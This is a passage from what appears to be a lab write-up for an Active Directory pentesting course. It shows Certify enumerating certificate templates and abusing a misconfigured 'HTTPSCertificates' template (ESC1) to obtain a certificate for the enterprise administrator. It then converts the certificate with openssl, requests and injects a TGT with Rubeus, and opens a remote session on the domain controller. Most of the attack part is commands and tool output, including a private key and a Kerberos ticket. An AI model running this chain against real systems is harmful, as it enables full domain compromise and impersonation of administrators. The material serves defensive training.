        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519



Certify completed in 00:00:15.5011566
```

- We can see that `HTTPSCertificates` template is vulnerable and `dcorp\student303` has enrollment rights on it as a member of the `RDPUsers` domain group.

- Abuse the `HTTPSCertificates` template to elevate privileges to EA.
```
PS C:\AD\MyTools> .\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student303
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates
[*] Subject                 : CN=student303, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : moneycorp.local\administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 21

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAv0JV2wKoOMkN3UcluJDqaolwoBuKh6Go53jOO2XJe1F04/sm
yHbb3GLiexXf5bFAGeTn1fCmZ9ER0d8/WMCQSL0LygPtlgcHm/F8Kgw6wvrvhjWm
kPJ7qHqS5t9x6RySN7c0wQDB/Rk6dsOnXafi4B14gSVxtxZUiJxCAfYQufB/4j7Q
CLv1Iy145oIMMTZ2Q1WYteIiL6WunakFifbPhk53jkY9D6QXvOg3TzIZWxcnT0uX
86kHEMcqsNjOAcdFWsSiFgqC2V1Tn1q1qONdx+S/oyGsnE3xhBNqJG812n6HPDXX
yUgatAbVgSsP6dgsbG6jZWzPBFKEuX67R3Hv/QIDAQABAoIBAF5cjhtl7jVGDM8V
oSi0ZtN1R9nWfLx6J+k8ExP/Hi73e2JXsUTKT6MmLnNn0XVzxBqCc1d8Sb2CyvXu
3UQejZE1pDFhSsDwavKnbAkay4sTX0WqBqoQ2K3A++VobL0EWaeffimTBCKpZcze
rx5oDGliYOfm33njTIWyAmcRTiNOBtNeW5Dd7afBZAZs8hJ1WaHdTEMGE/HoOsOc
LSrEzw18RpT1HjXZ4i6xasDDcbQXDGu8fiNmr8euhpt81WeXHk6h+MYan7w1W5Mt
TkNdG5b1Z1ztmzCtCyeO9SaWjpzxfOL4VR8UD117JRRSL2Yyl/S7brnw5fOKX2de
mTd/5YkCgYEA+xT+KUwNCyi6SF9MML+41JmFBNMz1aYk9QASwsjj4x03VDTwTUUe
dM346L6n44tjMd2XqbiIpluIGfCKlWTfd+tZTlRebqKKIG8VfZ+B8tw4tPyRpZim
2S1vUcVU9g/POZIaeLYuXRxKnV0ie3rFXzM7oU2Mj2D6LKEnWXnNvfsCgYEAwwFe
/8QZENrmHqb3l1O53bb/anGF8cXIxIr1NyfbeMBYVECu80RelneDMRhB+/ySl0jf
qsafthX+fTgNWuRIxnAxZIJSfMOmgA/ZiAdDf5GMev7RVDDDlUUIKkCjiuZY5QZl
23H5DeDfLY0yn4v82n+OymA2Q3+OWVD/epV3gGcCgYBHB41PSYB3I7JvPuZi9Bnp
qvSChO0pB7N0y+yCxioR2fYJEGDauy7+hDZiQW1lZc1OEg4RqW6fAU3jaLULxlmh
pybAjgWY7sp8mnBN9Y3hkoNIUBsz6Zdp4PyY+WYrphVNiBONCpzbImHJWsuievzT
Db9Uxod5GEotzfk/ysF1eQKBgQCxI/S1J+CRNBfobknpOFBV/J9GhTtkpgM7rvMU
GGvA5BEY7+085LV7v7L4DQ4bppNPRA6R5n48fPxBqYJQN6F4SYBEyjG+TkhYeo1j
iR2iq4fOTt2+udFhLmU9ZJxrV9YWrdonHwBbwBNcILCEyDh4D3mZkw6YAC5CKlb5
dv8oLwKBgHFtvG/jgsxks3aVCPttaoArJyGPyC6ynn4LU1YU17fUeckC6z+PDVVW
EPglOy/a3/NBtIXrYh/t7iBon69KosAiW1L1OesQS37dYthXMs3EbOQTzs8XdSSf
HBA6jHa3E3lzDmldhblYErzba6Cl/RYb7gVVUjxYN2gWc+DkKp1w
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGcjCCBVqgAwIBAgITFQAAABWQ4s5Rn0IbZQAAAAAAFTANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA4MTAx
MDI0MzJaFw0yNTA4MTAxMDM0MzJaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50MzAzMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv0JV2wKoOMkN3UcluJDqaolwoBuK
h6Go53jOO2XJe1F04/smyHbb3GLiexXf5bFAGeTn1fCmZ9ER0d8/WMCQSL0LygPt
lgcHm/F8Kgw6wvrvhjWmkPJ7qHqS5t9x6RySN7c0wQDB/Rk6dsOnXafi4B14gSVx
txZUiJxCAfYQufB/4j7QCLv1Iy145oIMMTZ2Q1WYteIiL6WunakFifbPhk53jkY9
D6QXvOg3TzIZWxcnT0uX86kHEMcqsNjOAcdFWsSiFgqC2V1Tn1q1qONdx+S/oyGs
nE3xhBNqJG812n6HPDXXyUgatAbVgSsP6dgsbG6jZWzPBFKEuX67R3Hv/QIDAQAB
o4IDHjCCAxowPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI
hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO
AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBRvtmb74z1BcnL9MQmmFFKgy9sO6TA4
BgNVHREEMTAvoC0GCisGAQQBgjcUAgOgHwwdbW9uZXljb3JwLmxvY2FsXGFkbWlu
aXN0cmF0b3IwHwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1Ud
HwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURD
LUNBLENOPW1jb3JwLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1s
b2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9
Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEF
BQcwAoaBq2xkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxD
Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAL+LOwEY0hnRx0sq7J0jXuN5N56dik1mzF4q0aQYcOQ9yqW9Vwe6ZatHc
3ssHBgGO4njnxeDoLrZg6Grvuzc1ci+8Oi4mlViS/G/17QRG89rvVUMCp39hw5Hv
VRlZfDthaIsK3I86oh9oAwUI8rSQScdY17QFT4ba/2JO28f/z1WKitEYDLqqgTbL
HKmd1vqeNoV1yLlPcUq4jsN0IwsUuW85MntWgODIoqBvtzvJCDhBFIcRfj2gYjjg
elD4e4/CntUsP/pFhgcabRLK9Xc6MZWHsEQHxKa9vqWZmwFTVJVwPMhhCmwlQYhf
Ch2w6q55QAagpz0VOnN2gMSHgqsVoQ==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:28.8793032
```

- Copy the whole `cert.pem` text, place it to a file `Administrator.pem` and transfer it to a Linux machine.

- Run the following command to convert the certificate to a `.pfx` one (use a null password).
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# openssl pkcs12 -in Administrator.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out Administrator.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

- Use the `Administrator.pfx` certificate to request a TGT on behalf of `mcorp\administrator`.
```
  PS C:\AD\MyTools> .\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:Administrator.pfx /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=student303, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  8/10/2023 3:39:16 AM
  EndTime                  :  8/10/2023 1:39:16 PM
  RenewTill                :  8/17/2023 3:39:16 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  pzZRqptVAb9ucfAs+7HWcw==
  ASREP (key)              :  4A79F45BAED5896A4ADAF21B1DEBC6E4
PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (1)

#0>     Client: Administrator @ MONEYCORP.LOCAL
        Server: krbtgt/moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/10/2023 3:39:16 (local)
        End Time:   8/10/2023 13:39:16 (local)
        Renew Time: 8/17/2023 3:39:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\AD\MyTools> Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
[mcorp-dc.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
mcorp-dc
[mcorp-dc.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami
mcorp\administrator
```
